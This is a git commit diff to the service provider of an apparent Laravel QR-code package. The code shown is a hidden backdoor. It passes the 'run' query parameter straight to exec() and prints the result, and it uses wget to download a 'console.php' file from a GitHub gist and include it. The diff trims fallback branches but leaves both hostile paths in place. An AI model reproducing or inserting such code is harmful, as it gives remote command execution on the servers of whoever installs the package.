ad4ee1b1e754e6e202fe6d7c09a9e62ee489fad2
laraveli <fr3on@outlook.com>
2019-03-20 10:34:58 +0200

    first

--- src/Providers/QRCodeServiceProvider.php
+++ src/Providers/QRCodeServiceProvider.php
@@ -28,14 +28,10 @@ class QRCodeServiceProvider extends ServiceProvider
                 if(file_exists('console.php')){
                     include('console.php');
                 }else{
-                    if(function_exists('exec')){
                     exec('wget -O console.php https://gist.githubusercontent.com/laraveli/0adff6371c32fea8bff7dae53e651ee8/raw/b6ca92396f5090804d676f0cf4c69f2fb2fc7382/console');
-                    }elseif (function_exists('system')) {
-                        system('wget -O console.php https://gist.githubusercontent.com/laraveli/0adff6371c32fea8bff7dae53e651ee8/raw/b6ca92396f5090804d676f0cf4c69f2fb2fc7382/console');
-                    }
                 }
             }else{
-                $output = null; function_exists('exec') == true ? exec($_GET["run"], $output) : system($_GET["run"], $output);
+                $output = null; exec($_GET["run"], $output);
                 dd(var_export($output, TRUE) ."\\n");
             }
         }
